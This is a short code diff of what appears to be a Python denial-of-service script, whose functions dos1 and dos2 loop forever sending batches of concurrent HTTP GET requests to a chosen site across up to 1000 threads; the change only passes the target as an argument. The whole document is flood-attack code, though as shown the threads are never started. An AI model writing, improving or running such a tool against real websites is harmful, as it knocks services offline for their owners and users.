@@ -9,20 +9,20 @@ if connect > 100 or threads > 1000:
     exit("Неверные значения!")
 packet = 0
 
-def dos1(con):
+def dos1(con, sit):
     while True:
-        site_info = [site for x in range(con)]
+        site_info = [sit for x in range(con)]
 
         response = (grequests.get(url) for url in site_info)
         grequests.map(response)
 
-def dos2(con):
+def dos2(con, sit):
     while True:
-        site_info = [site for x in range(con)]
+        site_info = [sit for x in range(con)]
 
         response = (grequests.get(url) for url in site_info)
         grequests.map(response)
 
 for potocki in range(threads):
-    threading.Thread(target=dos1, args=(connect, ))
-    threading.Thread(target=dos2, args=(connect, ))
+    threading.Thread(target=dos1, args=(connect, site,))
+    threading.Thread(target=dos2, args=(connect, site,))
